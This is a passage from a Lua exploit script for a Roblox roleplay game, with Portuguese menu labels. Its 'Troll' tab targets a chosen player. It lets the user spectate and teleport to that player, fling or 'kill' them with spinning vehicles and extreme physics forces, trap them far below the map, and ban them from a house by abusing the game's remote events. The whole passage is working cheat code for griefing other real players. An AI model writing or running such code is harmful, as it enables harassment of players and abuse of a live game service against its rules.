    local remoteFunction = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l")
    if remoteFunction then
      remoteFunction:InvokeServer(unpack(args))
    end
  end
})

Button = Tab3:AddButton({
  Name = "Saco de Diamantes",
  Callback = function()
    local args = {
      [1] = "PickingTools",
      [2] = "DuffleBagDiamonds"
    }
    
    local remoteFunction = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l")
    if remoteFunction then
      remoteFunction:InvokeServer(unpack(args))
    end
  end
})

Button = Tab3:AddButton({
  Name = "Chave Preta do Banco",
  Callback = function()
    local args = {
      [1] = "PickingTools",
      [2] = "BankGateKey"
    }
    
    local remoteFunction = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l")
    if remoteFunction then
      remoteFunction:InvokeServer(unpack(args))
    end
  end
})

Tab4 = Window:MakeTab({Name = "Troll", Icon = "rbxassetid://10734975692"})

local Paragraph = Tab4:AddParagraph({"Troll", "Flings & Kills"})

local Dropdown = Tab4:AddDropdown({
    Name = "Selecione O Jogador.",
    Options = {},
    Default = {},
    MultiSelect = false,
    Callback = function(Value)
        getgenv().Target = Value
    end
})

local function populateDropdown()
    local playersList = {}
    for _, player in pairs(game.Players:GetPlayers()) do
        table.insert(playersList, player.Name)
    end
    Dropdown:Set(playersList, true)
end

game.Players.PlayerAdded:Connect(populateDropdown)
game.Players.PlayerRemoving:Connect(populateDropdown)

populateDropdown()

local function playNotificationSound()
    local sound = Instance.new("Sound")
    sound.SoundId = "rbxassetid://9074670249"
    sound.Volume = 1
    sound.PlayOnRemove = true
    sound.Parent = workspace
    sound:Destroy()
end

local function makeNotification(notification)
    playNotificationSound()
    local Notify = Library:MakeNotify({
        Title = notification.Title,
        Text = notification.Text,
        Time = notification.Time or 5
    })
end

local viewEnabled = false
local characterAddedConnection = nil

local function toggleView(enabled)
    if enabled then
        local targetPlayer = game.Players:FindFirstChild(getgenv().Target)
        if targetPlayer then
            game.Workspace.CurrentCamera.CameraSubject = targetPlayer.Character
            if characterAddedConnection then
                characterAddedConnection:Disconnect()
            end
            characterAddedConnection = targetPlayer.CharacterAdded:Connect(function(character)
                game.Workspace.CurrentCamera.CameraSubject = character
            end)
            makeNotification({
                Title = "Visualizando " .. targetPlayer.Name,
                Text = "Você está visualizando o jogador: " .. targetPlayer.Name,
                Time = 6
            })
        else
            viewEnabled = false
        end
    else
        if characterAddedConnection then
            characterAddedConnection:Disconnect()
            characterAddedConnection = nil
        end
        game.Workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
        makeNotification({
            Title = "Visualização Desativada",
            Text = "Você desativou a visualização.",
            Time = 6
        })
    end
end

local function setTargetPlayer(playerName)
    getgenv().Target = playerName
end

Tab4:AddToggle({
    Name = "View",
    Default = false,
    Callback = function(Value)
        viewEnabled = Value
        toggleView(Value)
    end
})

local function maintainView()
    while wait() do
        if viewEnabled and getgenv().Target then
            local targetPlayer = game.Players:FindFirstChild(getgenv().Target)
            if targetPlayer and game.Workspace.CurrentCamera.CameraSubject ~= targetPlayer.Character then
                game.Workspace.CurrentCamera.CameraSubject = targetPlayer.Character
            end
        end
    end
end

spawn(maintainView)

setTargetPlayer("Shelby")

game.Players.PlayerRemoving:Connect(function(player)
    if getgenv().Target == player.Name then
        getgenv().Target = nil
        if viewEnabled then
            toggleView(false)
            makeNotification({
                Title = "Jogador Saiu",
                Text = player.Name .. " saiu do jogo. Visualização desativada.",
                Time = 4
            })
        end
    end
end)

Tab4:AddButton({
    Name = "Goto",
    Callback = function()
        local player = game.Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()

        if getgenv().Target then
            local target = game.Workspace:FindFirstChild(getgenv().Target)
            if target and target:FindFirstChild("HumanoidRootPart") then
                character:MoveTo(target.HumanoidRootPart.Position)
            else
                warn("Alvo inválido ou não encontrado!")
            end
        else
            warn("Nenhum alvo definido em getgenv().Target!")
        end
    end
})

local Section = Tab4:AddSection({"<Small Avatar-"})

Tab4:AddButton({
    Name = "Reiniciar O Tamanho Padrão.",
    Callback = function()
        local args = {
            [1] = "CharacterSizeUp",
            [2] = 1
        }
        local remoteEvent = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clothe1s")
        if remoteEvent then
            remoteEvent:FireServer(unpack(args))
        else
            warn("Evento remoto '1Clothe1s' não encontrado em ReplicatedStorage.RE")
        end
    end
})

Tab4:AddButton({
    Name = "Ficar Super Pequeno.",
    Callback = function()
        local args = {
            [1] = "CharacterSizeDown",
            [2] = 4
        }
        local remoteEvent = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clothe1s")
        if remoteEvent then
            remoteEvent:FireServer(unpack(args))
        else
            warn("Evento remoto '1Clothe1s' não encontrado em ReplicatedStorage.RE")
        end
    end
})

local Section = Tab4:AddSection({"<Combate Sofá-"})

-- Variáveis e Serviços
local player = game.Players.LocalPlayer
local runService = game:GetService("RunService")
local targetPlayer
local loopActive = false
local Angle = 0
local impulseActive = false
local actionConnection

-- Função para encontrar o jogador com base no nome da variável global getgenv().Target
local function findTarget()
    local namePart = getgenv().Target
    if namePart then
        for _, plr in ipairs(game.Players:GetPlayers()) do
            if string.find(string.lower(plr.Name), string.lower(namePart)) then
                return plr
            end
        end
    end
    return nil
end

-- Função para aplicar força de impulso ao jogador
local function applyImpulse()
    if not impulseActive then
        impulseActive = true
        local bodyVelocity = Instance.new("BodyVelocity")
        bodyVelocity.Velocity = Vector3.new(9e6, 9e6, 9e6)
        bodyVelocity.MaxForce = Vector3.new(9e6, 9e6, 9e6)
        bodyVelocity.Parent = player.Character.HumanoidRootPart

        local bodyAngularVelocity = Instance.new("BodyAngularVelocity")
        bodyAngularVelocity.AngularVelocity = Vector3.new(9e6, 9e6, 9e6)
        bodyAngularVelocity.MaxTorque = Vector3.new(9e6, 9e6, 9e6)
        bodyAngularVelocity.Parent = player.Character.HumanoidRootPart
    end
end

-- Função para remover a força de impulso
local function removeImpulse()
    impulseActive = false
    if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        for _, child in ipairs(player.Character.HumanoidRootPart:GetChildren()) do
            if child:IsA("BodyVelocity") or child:IsA("BodyAngularVelocity") then
                child:Destroy()
            end
        end
    end
end

-- Função para aplicar a rotação especificada
local function FPos(part, targetCFrame, rotation)
    part.CFrame = targetCFrame * rotation
end

-- Função para iniciar o loop de ação
local function startActionLoop()
    loopActive = true
    actionConnection = runService.Stepped:Connect(function()
        if loopActive and targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
            local targetPosition = targetPlayer.Character.HumanoidRootPart.CFrame
            local basePart = player.Character.HumanoidRootPart
            local tHumanoid = targetPlayer.Character.Humanoid
            local tRootPart = targetPlayer.Character.HumanoidRootPart

            -- Incremento do ângulo
            Angle = Angle + 100

            -- Primeira sequência de rotações
            FPos(basePart, targetPosition * CFrame.new(0, 1.5, 0) + tHumanoid.MoveDirection * basePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
            task.wait()
            
            FPos(basePart, targetPosition * CFrame.new(0, -1.5, 0) + tHumanoid.MoveDirection * basePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
            task.wait()

            FPos(basePart, targetPosition * CFrame.new(2.25, 1.5, -2.25) + tHumanoid.MoveDirection * basePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
            task.wait()

            FPos(basePart, targetPosition * CFrame.new(-2.25, -1.5, 2.25) + tHumanoid.MoveDirection * basePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
            task.wait()

            FPos(basePart, targetPosition * CFrame.new(0, 1.5, 0) + tHumanoid.MoveDirection, CFrame.Angles(math.rad(Angle), 0, 0))
            task.wait()

            FPos(basePart, targetPosition * CFrame.new(0, -1.5, 0) + tHumanoid.MoveDirection, CFrame.Angles(math.rad(Angle), 0, 0))
            task.wait()
            
            -- Segunda sequência de rotações
            FPos(basePart, targetPosition * CFrame.new(0, 1.5, tHumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
            task.wait()

            FPos(basePart, targetPosition * CFrame.new(0, -1.5, -tHumanoid.WalkSpeed), CFrame.Angles(0, 0, 0))
            task.wait()

            FPos(basePart, targetPosition * CFrame.new(0, 1.5, tHumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
            task.wait()
            
            FPos(basePart, targetPosition * CFrame.new(0, 1.5, tRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
            task.wait()

            FPos(basePart, targetPosition * CFrame.new(0, -1.5, -tRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(0, 0, 0))
            task.wait()

            FPos(basePart, targetPosition * CFrame.new(0, 1.5, tRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
            task.wait()

            FPos(basePart, targetPosition * CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0))
            task.wait()

            FPos(basePart, targetPosition * CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
            task.wait()

            FPos(basePart, targetPosition * CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(-90), 0, 0))
            task.wait()

            FPos(basePart, targetPosition * CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
            task.wait()

            -- Aplica o impulso no final do ciclo
            applyImpulse()
        end
    end)
end

-- Função para parar a ação
local function stopActionLoop()
    loopActive = false
    if actionConnection then
        actionConnection:Disconnect()
        actionConnection = nil
    end
    removeImpulse()
end

-- Adicionando o Toggle para ativar/desativar o Fling Kick
Tab4:AddToggle({
    Name = "Fling Couch - Kick",
    Default = false,
    Callback = function(Value)
        if Value then
            targetPlayer = findTarget()
            if targetPlayer then
                startActionLoop()
            else
                warn("Defina um alvo válido usando getgenv().Target antes de ativar o Toggle.")
            end
        else
            stopActionLoop()
        end
    end
})

local Section = Tab4:AddSection({"<Combate Veículo-"})

Tab4:AddButton({
    Name = "Fling - Boat",
    Callback = function()
        local TargetName = getgenv().Target
        local Player = game.Players.LocalPlayer
        local Character = Player.Character
        local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
        local RootPart = Character and Character:FindFirstChild("HumanoidRootPart")
        local Vehicles = game.Workspace:FindFirstChild("Vehicles")

        if not TargetName or not Humanoid or not RootPart then
            warn("Target inválido ou jogador sem Humanoid/RootPart")
            return
        end

        -- Função para spawnar o barco
        local function spawnBoat()
            RootPart.CFrame = CFrame.new(1754, -2, 58)
            task.wait(0.5)
            game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer("PickingBoat", "MilitaryBoatFree")
            task.wait(1)
            return Vehicles:FindFirstChild(Player.Name.."Car")
        end

        -- Garante que o barco foi spawnado
        local PCar = Vehicles:FindFirstChild(Player.Name.."Car") or spawnBoat()
        if not PCar then
            warn("Falha ao spawnar o barco")
            return
        end

        -- Aguarda o assento do barco
        local Seat = PCar:FindFirstChild("Body") and PCar.Body:FindFirstChild("VehicleSeat")
        if not Seat then
            warn("Nenhum assento encontrado no barco")
            return
        end

        -- Tenta sentar no barco
        repeat 
            task.wait()
            RootPart.CFrame = Seat.CFrame * CFrame.new(0, math.random(-1, 1), 0)
        until Humanoid.Sit

        -- Criando e adicionando o SpinGyro no barco
        local SpinGyro = Instance.new("BodyGyro")
        SpinGyro.Parent = PCar.PrimaryPart
        SpinGyro.MaxTorque = Vector3.new(1e7, 1e7, 1e7)
        SpinGyro.P = 1e7
        SpinGyro.CFrame = PCar.PrimaryPart.CFrame * CFrame.Angles(0, math.rad(90), 0)

        -- Ajustando a gravidade para o efeito de gravidade lunar
        workspace.Gravity = 0.1  -- Gravidade reduzida, simulando a lua

        print("SpinGyro ativado no barco! Gravidade ajustada para a lua!")

        -- Localiza o jogador alvo
        local TargetPlayer = game.Players:FindFirstChild(TargetName)
        if not TargetPlayer or not TargetPlayer.Character then
            warn("Alvo não encontrado no jogo")
            return
        end

        local TargetC = TargetPlayer.Character
        local TargetH = TargetC:FindFirstChildOfClass("Humanoid")
        local TargetRP = TargetC:FindFirstChild("HumanoidRootPart")

        if not TargetRP or not TargetH then
            warn("Alvo sem Humanoid/RootPart")
            return
        end

        -- Função para aplicar fling
        local function flingTarget()
            local function kill(alvo, pos)
                if PCar and PCar.PrimaryPart then
                    PCar:SetPrimaryPartCFrame(CFrame.new(alvo.Position) * pos)
                end
            end

            -- Aplica o efeito de Fling no alvo
            kill(TargetRP, CFrame.new(0, 3, 0) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.05)
            kill(TargetRP, CFrame.new(0, -2.25, 5) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.05)
            kill(TargetRP, CFrame.new(0, 2.25, 0.25) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10)
            kill(TargetRP, CFrame.new(-2.25, -1.5, 2.25) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10)
            kill(TargetRP, CFrame.new(0, 1.5, 0) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.05)
            kill(TargetRP, CFrame.new(0, -1.5, 0) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.05)
        end

        -- Loop para verificar se o barco desapareceu e teleportar 5 vezes sem impulsionar o jogador
        task.spawn(function()
            local teleportCount = 0
            local spawnPos = CFrame.new(1754, 5, 58) -- Posição de Spawn

            while teleportCount < 5 do
                task.wait(0.5) -- Espera entre os teletransportes
                if not PCar or not PCar.Parent then
                    -- Desativa o BodyGyro para evitar o impulso
                    SpinGyro:Destroy()

                    -- Teleporta o jogador para a posição de spawn
                    RootPart.CFrame = spawnPos
                    teleportCount = teleportCount + 1
                    print("Teleportando para a posição de spawn... Teleporte #" .. teleportCount)

                    -- Impede que o jogador seja impulsionado ao ser teleportado
                    Humanoid.PlatformStand = true
                    task.wait(0.5) -- Espera um tempo para garantir que o jogador não seja impulsionado

                    -- Recria o BodyGyro no barco
                    SpinGyro = Instance.new("BodyGyro")
                    SpinGyro.Parent = PCar.PrimaryPart
                    SpinGyro.MaxTorque = Vector3.new(1e7, 1e7, 1e7)
                    SpinGyro.P = 1e7
                    SpinGyro.CFrame = PCar.PrimaryPart.CFrame * CFrame.Angles(0, math.rad(90), 0)
                else
                    break
                end
            end

            -- Após os 5 teletransportes, retoma o fling no alvo
            while true do
                task.wait(0.5)
                if PCar and PCar.Parent then
                    flingTarget()  -- Continua o fling
                else
                    break
                end
            end
        end)

        -- Verifica se o barco foi apagado, restaurando a gravidade para o valor padrão
        game:GetService("RunService").Heartbeat:Connect(function()
            if not PCar or not PCar.Parent then
                workspace.Gravity = 196.2  -- Restaura a gravidade para o valor padrão da Terra
                print("Barco apagado, gravidade restaurada para o padrão.")
            end
        end)
    end
})

Tab4:AddButton({
    Name = "Desligar Fling Boat",
    Callback = function()
        -- Apaga o barco
        local args = {
            [1] = "DeleteAllVehicles"
        }

        -- Chama o evento para apagar o barco
        game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer(unpack(args))

        -- Aguarda um tempo para garantir que o barco foi apagado
        task.wait(2)

        -- Obtém todos os assentos no jogo
        local seats = {}
        for _, vehicle in pairs(game.Workspace.Vehicles:GetChildren()) do
            for _, seatPart in pairs(vehicle:GetDescendants()) do
                if seatPart:IsA("VehicleSeat") then
                    table.insert(seats, seatPart)
                end
            end
        end

        -- Se houver assentos disponíveis, teleporta o jogador para um aleatório
        if #seats > 0 then
            local randomSeat = seats[math.random(1, #seats)]  -- Escolhe aleatoriamente um assento
            local seatPosition = randomSeat.CFrame

            -- Teleporta o jogador para o assento
            local Player = game.Players.LocalPlayer
            local Character = Player.Character
            Character:SetPrimaryPartCFrame(seatPosition)
            
            -- Define o jogador sentado no assento
            local humanoid = Character:FindFirstChildOfClass("Humanoid")
            if humanoid then
                humanoid.Sit = true
            end

            print("Jogador teleportado para um assento aleatório.")
        else
            print("Nenhum assento encontrado.")
        end

        -- Desativa o BodyGyro do barco, se estiver presente
        local PCar = game.Workspace.Vehicles:FindFirstChild(Player.Name.."Car")
        if PCar then
            local SpinGyro = PCar.PrimaryPart:FindFirstChildOfClass("BodyGyro")
            if SpinGyro then
                SpinGyro:Destroy()  -- Remove o BodyGyro para parar o impulso
                print("BodyGyro desativado no barco.")
            end
        end

        -- Restaura a gravidade para o valor padrão da Terra
        workspace.Gravity = 196.2
        print("Gravidade restaurada para o padrão da Terra.")
    end
}) 

Tab4:AddButton({
    Name = "Ban - House",
    Callback = function()
        local Player = game.Players.LocalPlayer
        local Backpack = Player.Backpack
        local Character = Player.Character
        local Humanoid = Character:FindFirstChildOfClass("Humanoid")
        local RootPart = Character:FindFirstChild("HumanoidRootPart")
        local Houses = game.Workspace:FindFirstChild("001_Lots")
        local OldPos = RootPart.CFrame
        local Angles = 0
        local Vehicles = Workspace.Vehicles
        local Pos

        -- Function:
        function Check()
            if Player and Character and Humanoid and RootPart and Vehicles then
                return true
            else
                return false
            end
        end

        -- Main:
        if not getgenv().Target then
            return
        end
        if Check() then
            local House = Houses:FindFirstChild(Player.Name.."House")
            if not House then
                local EHouse
                for _,Lot in pairs(Houses:GetChildren()) do
                    if Lot.Name == "For Sale" then
                        for _,num in pairs(Lot:GetDescendants()) do
                            if num:IsA("NumberValue") and num.Name == "Number" and num.Value < 25 and num.Value > 10 then
                                EHouse = Lot
                                break
                            end
                        end
                    end
                end

                local BuyDetector = EHouse:FindFirstChild("BuyHouse")
                Pos = BuyDetector.Position
                if BuyDetector and BuyDetector:IsA("BasePart") then
                    RootPart.CFrame = BuyDetector.CFrame + Vector3.new(0,-6,0)
                    task.wait(.5)
                    local ClickDetector = BuyDetector:FindFirstChild("ClickDetector")
                    if ClickDetector then
                        fireclickdetector(ClickDetector)
                    end
                end
            end

            task.wait(0.5)
            local PreHouse = Houses:FindFirstChild(Player.Name .. "House")
            if PreHouse then
                task.wait(0.5)
                local Number
                for i,x in pairs(PreHouse:GetDescendants()) do
                    if x.Name == "Number" and x:IsA("NumberValue") then
                        Number = x
                    end
                end
                task.wait(0.5)
                game:GetService("ReplicatedStorage").RE:FindFirstChild("1Gettin1gHous1e"):FireServer("PickingCustomHouse","052_House", Number.Value)
            end

            task.wait(0.5)
            local PCar = Vehicles:FindFirstChild(Player.Name.."Car")
            if not PCar then
                if Check() then
                    RootPart.CFrame = CFrame.new(1118.81, 75.998, -1138.61)
                    task.wait(0.5)
                    game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer("PickingCar","SchoolBus")
                    task.wait(0.5)
                    local PCar = Vehicles:FindFirstChild(Player.Name.."Car")
                    task.wait(0.5)
                    local Seat = PCar:FindFirstChild("Body") and PCar.Body:FindFirstChild("VehicleSeat")
                    if Seat then
                        repeat task.wait()
                            RootPart.CFrame = Seat.CFrame * CFrame.new(0, math.random(-1, 1), 0)
                        until Humanoid.Sit
                    end
                end
            end

            task.wait(0.5)
            local PCar = Vehicles:FindFirstChild(Player.Name.."Car")
            if PCar then
                if not Humanoid.Sit then
                    local Seat = PCar:FindFirstChild("Body") and PCar.Body:FindFirstChild("VehicleSeat")
                    if Seat then
                        repeat task.wait()
                            RootPart.CFrame = Seat.CFrame * CFrame.new(0, math.random(-1, 1), 0)
                        until Humanoid.Sit
                    end
                end

                local Target = game.Players:FindFirstChild(getgenv().Target)
                local TargetC = Target.Character
                local TargetH = TargetC:FindFirstChildOfClass("Humanoid")
                local TargetRP = TargetC:FindFirstChild("HumanoidRootPart")
                if TargetC and TargetH and TargetRP then
                    if not TargetH.Sit then
                        while not TargetH.Sit do
                            task.wait()
                            local Fling = function(alvo,pos,angulo)
                                PCar:SetPrimaryPartCFrame(CFrame.new(alvo.Position) * pos * angulo)
                            end
                            Angles = Angles + 100
                            Fling(TargetRP,CFrame.new(0, 1.5, 0) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10,CFrame.Angles(math.rad(Angles), 0, 0))
                            Fling(TargetRP,CFrame.new(0, -1.5, 0) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10,CFrame.Angles(math.rad(Angles), 0, 0))
                            Fling(TargetRP,CFrame.new(2.25, 1.5, -2.25)  + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10,CFrame.Angles(math.rad(Angles), 0, 0))
                            Fling(TargetRP,CFrame.new(-2.25, -1.5, 2.25) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10,CFrame.Angles(math.rad(Angles), 0, 0))
                            Fling(TargetRP,CFrame.new(0, 1.5, 0) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10,CFrame.Angles(math.rad(Angles), 0, 0))
                            Fling(TargetRP,CFrame.new(0, -1.5, 0) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10,CFrame.Angles(math.rad(Angles), 0, 0))
                        end

                        task.wait(0.2)
                        local House = Houses:FindFirstChild(Player.Name.."House")
                        PCar:SetPrimaryPartCFrame(CFrame.new(House.HouseSpawnPosition.Position))
                        task.wait(0.2)
                        local pedro = Region3.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position - Vector3.new(30,30,30),game.Players.LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(30,30,30))

                        local a = workspace:FindPartsInRegion3(pedro,game.Players.LocalPlayer.Character.HumanoidRootPart,math.huge)

                        for i,v in pairs(a) do
                            if v.Name == "HumanoidRootPart" then
                                local b = game:GetService("Players"):FindFirstChild(v.Parent.Name)
                                local args = {
                                    [1] = "BanPlayerFromHouse",
                                    [2] = b,
                                    [3] = v.Parent
                                }

                                game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))

                                -- Excluir todos os veículos imediatamente após o banimento:
                                local args = {
                                    [1] = "DeleteAllVehicles"
                                }
                                game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer(unpack(args))
                            end
                        end
                    end
                end
            end
        end
    end
})

Tab4:AddButton({
    Name = "Car - Jail",
    Callback = function()
        -- Cria um baseplate na coordenada 0, -500, 0
        local baseplate = Instance.new("Part")
        baseplate.Size = Vector3.new(100, 1, 100)  -- Define o tamanho do baseplate
        baseplate.Position = Vector3.new(0, -610, 0)  -- Define a posição
        baseplate.Anchored = true  -- Deixa o baseplate ancorado no lugar
        baseplate.Color = Color3.fromRGB(255, 255, 255)  -- Cor branca
        baseplate.Parent = game.Workspace  -- Coloca o baseplate no Workspace

        local Target = getgenv().Target
        local Player = game.Players.LocalPlayer
        local Character = Player.Character
        local Humanoid = Character:FindFirstChildOfClass("Humanoid")
        local RootPart = Character:FindFirstChild("HumanoidRootPart")
        local Vehicles = game.Workspace:FindFirstChild("Vehicles")
        local OldPos = RootPart.CFrame

        if not Target or not Humanoid then return end

        local PCar = Vehicles:FindFirstChild(Player.Name.."Car")
        if not PCar then
            if RootPart and Target then 
                RootPart.CFrame = CFrame.new(1118.81, 75.998, -1138.61)
                task.wait(0.5)
                game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer("PickingCar", "SchoolBus")
                task.wait(0.5)
                PCar = Vehicles:FindFirstChild(Player.Name.."Car")
                task.wait(0.5)
                local Seat = PCar:FindFirstChild("Body") and PCar.Body:FindFirstChild("VehicleSeat")
                if Seat then
                    repeat task.wait()
                        RootPart.CFrame = Seat.CFrame * CFrame.new(0, math.random(-1, 1), 0)
                    until Humanoid.Sit
                end
            end
        end

        task.wait(0.5)
        PCar = Vehicles:FindFirstChild(Player.Name.."Car")
        if PCar and not Humanoid.Sit then
            local Seat = PCar:FindFirstChild("Body") and PCar.Body:FindFirstChild("VehicleSeat")
            if Seat then
                repeat task.wait()
                    RootPart.CFrame = Seat.CFrame * CFrame.new(0, math.random(-1, 1), 0)
                until Humanoid.Sit
            end
        end

        local TargetPlayer = game.Players:FindFirstChild(getgenv().Target)
        if TargetPlayer then
            local TargetC = TargetPlayer.Character
            local TargetH = TargetC:FindFirstChildOfClass("Humanoid")
            local TargetRP = TargetC:FindFirstChild("HumanoidRootPart")
            if TargetC and TargetH and TargetRP then
                if not TargetH.Sit then
                    while not TargetH.Sit do
                        task.wait()

                        -- Gera uma rotação aleatória
                        local randomX = math.random(-360, 360)
                        local randomY = math.random(-360, 360)
                        local randomZ = math.random(-360, 360)

                        -- Função para movimentar o carro
                        local moveCar = function(alvo, offset, rotation)
                            local newPosition = alvo.Position + offset
                            local newCFrame = CFrame.new(newPosition) * rotation
                            PCar:SetPrimaryPartCFrame(newCFrame)
                        end

                        -- Movimentos do carro ao redor do jogador alvo com rotações aleatórias
                        moveCar(TargetRP, Vector3.new(0, 1, 0), CFrame.Angles(math.rad(randomX), math.rad(randomY), math.rad(randomZ)))
                        moveCar(TargetRP, Vector3.new(0, -2.25, 5), CFrame.Angles(math.rad(randomX), math.rad(randomY), math.rad(randomZ)))
                        moveCar(TargetRP, Vector3.new(0, 2.25, 0.25), CFrame.Angles(math.rad(randomX), math.rad(randomY), math.rad(randomZ)))
                        moveCar(TargetRP, Vector3.new(-2.25, -1.5, 2.25), CFrame.Angles(math.rad(randomX), math.rad(randomY), math.rad(randomZ)))
                        moveCar(TargetRP, Vector3.new(0, 1.5, 0), CFrame.Angles(math.rad(randomX), math.rad(randomY), math.rad(randomZ)))
                        moveCar(TargetRP, Vector3.new(0, -1.5, 0), CFrame.Angles(math.rad(randomX), math.rad(randomY), math.rad(randomZ)))
                    end

                    -- Teleporte para a coordenada final
                    task.wait(0.1)
                    PCar:SetPrimaryPartCFrame(CFrame.new(0, -600, 0))

                    -- Finalização
                    task.wait(0.2)
                    Humanoid.Sit = false
                    task.wait(0.1)
                    RootPart.CFrame = OldPos
                end
            end
        end
    end
})

Tab4:AddButton({
    Name = "Car - Kill",
    Callback = function()
        local Target = getgenv().Target
        local Player = game.Players.LocalPlayer
        local Character = Player.Character
        local Humanoid = Character:FindFirstChildOfClass("Humanoid")
        local RootPart = Character:FindFirstChild("HumanoidRootPart")
        local Vehicles = game.Workspace:FindFirstChild("Vehicles")
        local OldPos = RootPart.CFrame

        if not Target or not Humanoid then return end

        local PCar = Vehicles:FindFirstChild(Player.Name.."Car")
        if not PCar then
            if RootPart and Target then 
                RootPart.CFrame = CFrame.new(1118.81, 75.998, -1138.61)
                task.wait(0.5)
                game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer("PickingCar", "CopUnderCoverSUV")
                task.wait(0.5)
                PCar = Vehicles:FindFirstChild(Player.Name.."Car")
                task.wait(0.5)
                local Seat = PCar:FindFirstChild("Body") and PCar.Body:FindFirstChild("VehicleSeat")
                if Seat then
                    repeat task.wait()
                        RootPart.CFrame = Seat.CFrame * CFrame.new(0, math.random(-1, 1), 0)
                    until Humanoid.Sit
                end
            end
        end

        task.wait(0.5)
        PCar = Vehicles:FindFirstChild(Player.Name.."Car")
        if PCar and not Humanoid.Sit then
            local Seat = PCar:FindFirstChild("Body") and PCar.Body:FindFirstChild("VehicleSeat")
            if Seat then
                repeat task.wait()
                    RootPart.CFrame = Seat.CFrame * CFrame.new(0, math.random(-1, 1), 0)
                until Humanoid.Sit
            end
        end

        local TargetPlayer = game.Players:FindFirstChild(getgenv().Target)
        if TargetPlayer then
            local TargetC = TargetPlayer.Character
            local TargetH = TargetC:FindFirstChildOfClass("Humanoid")
            local TargetRP = TargetC:FindFirstChild("HumanoidRootPart")
            if TargetC and TargetH and TargetRP then
                if not TargetH.Sit then
                    while not TargetH.Sit do
                        task.wait()

                        -- Gera uma rotação aleatória
                        local randomX = math.random(-360, 360)
                        local randomY = math.random(-360, 360)
                        local randomZ = math.random(-360, 360)

                        -- Função para movimentar o carro
                        local kill = function(alvo, pos, angulo)
                            PCar:SetPrimaryPartCFrame(CFrame.new(alvo.Position) * pos * angulo)
                        end

                        -- Movimentos do carro ao redor do jogador alvo com rotações aleatórias
                        kill(TargetRP, CFrame.new(0, 1, 0) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.05, CFrame.Angles(math.rad(randomX), math.rad(randomY), math.rad(randomZ)))
                        kill(TargetRP, CFrame.new(0, -2.25, 5) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.05, CFrame.Angles(math.rad(randomX), math.rad(randomY), math.rad(randomZ)))
                        kill(TargetRP, CFrame.new(0, 2.25, 0.25) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10, CFrame.Angles(math.rad(randomX), math.rad(randomY), math.rad(randomZ)))
                        kill(TargetRP, CFrame.new(-2.25, -1.5, 2.25) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10, CFrame.Angles(math.rad(randomX), math.rad(randomY), math.rad(randomZ)))
                        kill(TargetRP, CFrame.new(0, 1.5, 0) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.05, CFrame.Angles(math.rad(randomX), math.rad(randomY), math.rad(randomZ)))
                        kill(TargetRP, CFrame.new(0, -1.5, 0) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.05, CFrame.Angles(math.rad(randomX), math.rad(randomY), math.rad(randomZ)))
                    end

                    -- Movimenta o carro para longe ao final
                    task.wait(0.1)
                    PCar:SetPrimaryPartCFrame(CFrame.new(0, -470, 0))
                    task.wait(0.2)

                    -- Finalização
                    Humanoid.Sit = false
                    task.wait(0.1)
                    RootPart.CFrame = OldPos
                end
            end
        end
    end
})

local function bringPlayer()
    local Target = getgenv().Target
    local Player = game.Players.LocalPlayer
    local Character = Player.Character
    local Humanoid = Character:FindFirstChildOfClass("Humanoid")
    local RootPart = Character:FindFirstChild("HumanoidRootPart")
    local Vehicles = game.Workspace:FindFirstChild("Vehicles")
